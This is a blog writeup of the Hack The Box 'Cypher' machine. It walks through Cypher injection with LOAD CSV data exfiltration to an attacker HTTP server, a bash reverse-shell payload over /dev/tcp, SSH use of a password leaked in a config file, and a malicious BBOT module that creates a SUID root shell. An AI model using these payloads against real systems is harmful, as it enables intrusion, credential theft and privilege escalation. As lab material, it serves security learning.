---
title: "Cypher"
summary: "HTB Season 7"
categories: ["HackTheBox","Blog",]
tags: ["HackTheBox","Web"]
#externalUrl: ""
#showSummary: true
date: 2025-04-20
draft: false
---


# **Challenge Description**

- **Name:** Cypher
- **Category:** Web
- **Points:** 45

---

# Hack The Box - Cypher Writeup

## Enumeration

We started with a basic Nmap scan:

```bash
sudo nmap -sC -sV -vv -o nmap 10.10.11.57
```

Results:
```sh
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMurODrr5ER4wj9mB2tWhXcLIcrm4Bo1lIEufLYIEBVY4h4ZROFj2+WFnXlGNqLG6ZB+DWQHRgG/6wg71wcElxA=
|   256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqadcsjXAxI3uSmNBA8HUMR3L4lTaePj3o6vhgPuPTi
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


http-title: Did not follow redirect to http://cypher.htb/
Adding cypher.htb to /etc/hosts, we browsed the site and found a login form. Interacting with the form hinted at a Neo4j backend (based on error messages and behavior).

##  Cypher Injection Discovery
Testing the input with:
```sql
' OR 1=1 RETURN 1 AS foo //
```

...confirmed Cypher Injection. From here, we attempted to extract information.

### Cypher Label Enumeration via OOB Exfiltration
We set up a simple listener on our local machine:
`python3 -m http.server`
And used the following payload:

```sql

' OR 1=1 WITH 1 as a CALL db.labels() YIELD label 
LOAD CSV FROM "http://10.10.14.137:8000/?" + label AS b RETURN b //
```
On our HTTP server we saw:
```js
10.10.11.57 - - [19/Apr/2025 12:54:01] "GET /?USER HTTP/1.1" 200 -
10.10.11.57 - - [19/Apr/2025 12:54:01] "GET /?HASH HTTP/1.1" 200 -
10.10.11.57 - - [19/Apr/2025 12:54:02] "GET /?DNS_NAME HTTP/1.1" 200 -
10.10.11.57 - - [19/Apr/2025 12:54:02] "GET /?SHA1 HTTP/1.1" 200 -
10.10.11.57 - - [19/Apr/2025 12:54:03] "GET /?SCAN HTTP/1.1" 200 -
10.10.11.57 - - [19/Apr/2025 12:54:07] "GET /?ORG_STUB HTTP/1.1" 200 -
10.10.11.57 - - [19/Apr/2025 12:54:08] "GET /?IP_ADDRESS HTTP/1.1" 200 -
```

This confirmed we could leak data via LOAD CSV FROM over HTTP.

### Dumping User Hashes
With the labels discovered, we then used this final payload to extract usernames and password hashes:

```rust
' OR 1=1 MATCH (u:USER)-[:SECRET]->(h:SHA1) 
WITH u.name + ":" + h.value AS creds 
LOAD CSV FROM "http://10.10.14.137:8000/?" + creds AS l RETURN 0 as _0 //
```
Result:

```js
10.10.11.57 - - [19/Apr/2025 12:56:46] "GET /?graphasm:9f54ca4c130be6d529a56dee59dc2b2090e43acf HTTP/1.1" 200 -
```

We now had credentials.Lets try cracking the has with john

```sh
echo "9f54ca4c130be6d529a56dee59dc2b2090e43acf" > hash.txt

john --format=raw-sha1 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Unfortunately, the hash couldn't be cracked via hashcat or online databases.

## Remote Code Execution via custom.getUrlStatusCode
After inspecting the Neo4j installation and researching, we found that Neo4j allows importing and using custom procedures.

We tried this payload to trigger a reverse shell:

```sql
' return h.value as a union CALL custom.getUrlStatusCode("http://cypher.htb; bash -c 'bash -i >& /dev/tcp/10.10.14.137/4444 0>&1'") YIELD statusCode AS a RETURN a;//
```
With a listener ready:
`nc -lvnp 4444`

Shell obtained as neo4j user. Unfortunately we cant read the user flag as `neo4j` so we have to pivot to  user `graphasm


## User Pivot via SSH
Once inside, we found a preset config in `/home/graphasm/bbot_preset.yml`


cat /home/graphasm/bbot_preset.yml
Contents:
```yml
modules:
  neo4j:
    username: neo4j
    password: cU4btyib.20xtCMCXkBmerhK

```
Tried using it to SSH into graphasm with the password:
```sh
ssh graphasm@10.10.11.57

graphasm@cypher:~$ id
uid=1000(graphasm) gid=1000(graphasm) groups=1000(graphasm)
```
✅ SSH successful — now logged in as graphasm and can read the user flag.


## Privilege Escalation

### Enumeration

Running `sudo -l` revealed the following:
```bash
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

The binary `bbot` can be executed **as root without a password**.

Checking the file:

```sh
graphasm@cypher:~$ file /usr/local/bin/bbot
/usr/local/bin/bbot: symbolic link to /opt/pipx/venvs/bbot/bin/bbot
```

It's a Python tool installed via pipx — BBOT (BigHuge BLS OSINT Tool).

BBOT supports custom module loading via configuration YAMLs, which means we may be able to inject arbitrary code by creating a custom module.


### Exploitation via Custom BBOT Module

BBOT allows users to load additional Python modules from a user-defined directory using a config file.

1. Create a BBOT module config file

```sh
echo -e "module_dirs:\n - /tmp/modules" > /tmp/myconf.yml
```
This tells BBOT to load additional modules from `/tmp/modules`.

2. Create the module directory

```sh
mkdir -p /tmp/modules
```

3. Write a malicious BBOT module

Create a Python file:

```sh
nano /tmp/modules/whois2.py
```

Paste the following payload:
```python
from bbot.modules.base import BaseModule
import os

class whois2(BaseModule):
    watched_events = ["DNS_NAME"]
    produced_events = ["WHOIS"]
    flags = ["passive", "safe"]
    meta = {"description": "Malicious SUID Bash Dropper"}

    async def setup(self):
        # Exploit: copy bash to /tmp and enable SUID root
        os.system("cp /bin/bash /tmp/bash && chmod u+s /tmp/bash")

    async def handle_event(self, event):
        self.hugesuccess(f"Got {event} (event.data: {event.data})")

```


This copies `/bin/bash` to `/tmp/bash` and gives it the SUID bit, effectively making it a root shell when run.

4. Execute BBOT with the custom module

```sh
sudo /usr/local/bin/bbot -p /tmp/myconf.yml -m whois2 -t test.com
```

> [!NOTE]
> 
> > `-p` loads the custom config.  
> > `-m whois2` runs our malicious module.

This creates a root-owned SUID bash at `/tmp/bash`.


###  Get Root Shell

Now just run:

```sh
/tmp/bash -p
```

Now we have a root shell and can read the root flag
```sh
bash-5.2# id
uid=1000(graphasm) gid=1000(graphasm) euid=0(root) groups=1000(graphasm)

```
